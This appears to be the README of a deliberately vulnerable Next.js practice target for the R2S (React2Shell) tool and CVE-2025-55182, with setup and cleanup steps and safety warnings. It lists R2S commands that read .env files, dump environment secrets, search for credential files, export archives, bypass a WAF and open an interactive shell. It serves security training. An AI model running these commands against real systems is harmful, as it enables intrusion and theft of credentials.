# R2S Arena - Safe Testing Environment

**⚠️ WARNING: This application is INTENTIONALLY VULNERABLE!**

R2S Arena is a **safe testing environment** designed to help you test the R2S (React2Shell) tool locally without risking real systems. It runs Next.js 16.0.5, which is vulnerable to CVE-2025-55182, making it perfect for learning and testing.

## 🎯 Purpose

This application exists **ONLY** for:

- ✅ Testing the R2S exploitation tool safely
- ✅ Learning about CVE-2025-55182 in a controlled environment
- ✅ Security research and education
- ✅ Demonstrating vulnerability impact
- ❌ **NEVER for production use!**
- ❌ **NEVER with real data!**
- ❌ **NEVER on public networks without protection!**

## ⚠️ Legal Disclaimer

**This is an intentionally vulnerable application for testing purposes only.**

- This application is designed to be exploited for educational purposes
- It should only be used in isolated, controlled environments
- Never deploy this with real data or credentials
- Never expose this to the public internet without proper isolation
- The authors are not responsible for any misuse

**By using this application, you agree to use it only for legitimate security testing and educational purposes.**

## 🚀 Quick Start

### Install Dependencies

```bash
npm install
```

### Run Development Server

```bash
npm run dev
```

Server will start on `http://localhost:3000`

### Build for Production

```bash
npm run build
npm start
```

## 🧪 Testing with R2S Tool

This application is specifically designed to work with the R2S tool. Once the app is running, you can test various R2S features:

### Basic Testing

```bash
# Test if the application is vulnerable
r2s -u http://localhost:3000 -t

# Or if using Python module directly
python3 -m react2shell.main -u http://localhost:3000 -t
```

### Advanced Testing

```bash
# Test with WAF bypass techniques
r2s -u http://localhost:3000 -t --waf-bypass

# Get system information
r2s -u http://localhost:3000 --system-info

# List directory contents
r2s -u http://localhost:3000 --list-dir /app

# Read files
r2s -u http://localhost:3000 --read-file package.json
r2s -u http://localhost:3000 --read-file .env

# Try to extract secrets
r2s -u http://localhost:3000 --secrets

# Interactive shell
r2s -u http://localhost:3000 --shell

# Use exploit modules
r2s -u http://localhost:3000 --list-modules
r2s -u http://localhost:3000 --module env_dump
r2s -u http://localhost:3000 --module file_search --set pattern="*.env" --set path="/app"

# Export files and archives
r2s -u http://localhost:3000 --export src/app/page.tsx
r2s -u http://localhost:3000 --export-archive
```

### Online Demo

You can also test against our online demo (no setup required):

```bash
r2s -u https://r2s-arena.fly.dev -t
```

**Note:** The online demo is publicly accessible and intentionally vulnerable for testing purposes only.

## 🌐 Deployment (For Advanced Testing)

**⚠️ Only deploy this if you understand the security implications!**

### Option 1: Local Testing (Recommended)

Just run `npm run dev` - no deployment needed!

### Option 2: Isolated Server Testing

If you need to test on a real server:

1. **Build the app:**
   ```bash
   npm run build
   ```

2. **Deploy to an ISOLATED server** (use Docker, VM, or isolated environment)

3. **Test with R2S:**
   ```bash
   r2s -u https://your-test-domain.com -t --waf-bypass
   ```

### ⚠️ Critical Security Notes

- ⚠️ **NEVER deploy with real data or credentials**
- ⚠️ **ALWAYS use an isolated server/environment**
- ⚠️ **NEVER expose to public internet without proper isolation**
- ⚠️ **Monitor for unauthorized access attempts**
- ⚠️ **Delete immediately after testing**
- ⚠️ **This app is vulnerable by design - treat it as compromised**
- ⚠️ **Use firewall rules to restrict access if deploying publicly**

## 🔓 Security (Intentionally Vulnerable)

This application is **designed to be vulnerable** for testing purposes:

- **Next.js 16.0.5** - Contains CVE-2025-55182 vulnerability
- **No security middleware** - No WAF, no rate limiting
- **No input validation** - Accepts any input
- **Server Actions enabled** - The attack vector for CVE-2025-55182
- **No authentication** - Open to anyone
- **No logging/monitoring** - Minimal security controls

**This is intentional!** The app is designed to be easily exploitable so you can safely test the R2S tool.

## 📁 Project Structure

```
nextjs/
├── src/
│   └── app/
│       ├── page.tsx        # Main page with Server Action
│       ├── layout.tsx      # Root layout
│       ├── actions.ts      # Server Actions (vulnerable)
│       ├── globals.css     # Global styles
│       └── not-found.tsx   # 404 page
├── public/                 # Static assets
├── package.json            # Dependencies (Next.js 16.0.5)
├── next.config.js          # Next.js configuration
└── README.md               # This file
```

## 🧪 Testing Checklist

- [ ] App runs locally
- [ ] R2S tool can detect vulnerability
- [ ] R2S tool can execute commands
- [ ] R2S tool can read files
- [ ] R2S tool can extract secrets
- [ ] R2S tool can export files/archives
- [ ] R2S interactive shell works
- [ ] R2S modules work correctly
- [ ] Test with WAF bypass techniques
- [ ] Test on real server (if applicable)
- [ ] Document findings
- [ ] Clean up after testing

## 🧹 Cleanup

After testing:

1. Stop the server
2. Delete the application
3. Review logs for any successful attacks
4. Document what worked/didn't work

## 📚 Related Documentation

- **Main R2S Tool:** See [`../README.md`](../README.md) for full R2S documentation
- **R2S Architecture:** See [`../react2shell/README.md`](../react2shell/README.md) for architecture details
- **CVE-2025-55182:** [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55182)

## 🎓 Learning Resources

- [CVE-2025-55182 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55182)
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/configuring/security)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

## 📄 License

This application is provided for security testing and educational purposes only.

See the main project [`../README.md`](../README.md) for full legal disclaimers.

---

## ⚠️ Final Reminder

**This is a testing application, not a production app!**

- ✅ Use it to learn about security vulnerabilities
- ✅ Use it to test security tools safely
- ✅ Use it in isolated environments
- ❌ Never use it with real data
- ❌ Never deploy it to production
- ❌ Never expose it without proper isolation

**Stay safe, learn responsibly! 🛡️**
